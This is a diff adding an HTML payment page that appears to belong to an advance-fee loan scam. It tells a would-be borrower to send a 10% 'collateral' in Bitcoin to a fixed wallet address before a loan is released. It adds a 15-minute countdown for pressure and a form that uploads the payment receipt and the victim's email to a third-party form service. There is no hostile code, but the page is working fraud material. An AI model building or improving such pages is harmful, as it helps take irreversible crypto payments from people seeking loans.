@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Complete Payment</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<section class="payment-container">
+
+  <h1>Complete Your Collateral Payment</h1>
+
+<p class="status">Waiting for your payment...</p>
+
+<p class="note">
+  After sending payment, upload your receipt below.  
+  Your loan will be processed within 5–15 minutes after confirmation.
+</p>
+
+  <p class="warning">
+    ⚠️ Send the exact Bitcoin amount to the address below
+  </p>
+
+  <!-- BTC ADDRESS -->
+  <div class="address-box">
+    <p>Bitcoin Address:</p>
+    <h3 id="btcAddress">bc1qu9d6lv4rvkdkh34t8kk4ge0egc7r2m954tc2jq</h3>
+    <button onclick="copyAddress()">Copy Address</button>
+  </div>
+
+  <!-- QR CODE -->
+  <div class="qr">
+    <img src="images/btc-qr.png" alt="QR Code">
+  </div>
+
+  <div class="payment-info">
+  <h2>Complete Your Payment</h2>
+  <p><strong>Name:</strong> <span id="pName"></span></p>
+  <p><strong>Email:</strong> <span id="pEmail"></span></p>
+  <p><strong>Loan Amount:</strong> $<span id="pLoan"></span></p>
+  <p><strong>Collateral (10%):</strong> $<span id="pCollateral"></span></p>
+  <p><strong>BTC Equivalent:</strong> <span id="pBTC"></span> BTC</p>
+</div>
+  
+  <!-- COUNTDOWN -->
+  <div class="countdown">
+    <h2 id="timer">15:00</h2>
+    <p>Time left to complete payment</p>
+  </div>
+
+  <!-- UPLOAD RECEIPT -->
+  <form action="https://formspree.io/f/xxxxabcd" method="POST" enctype="multipart/form-data">
+    <input type="file" name="receipt" required>
+    <input type="email" name="email" placeholder="Your Email" required>
+    <button type="submit">Upload Receipt</button>
+  </form>
+
+</section>
+
+<script src="payment.js"></script>
+</body>
+</html>
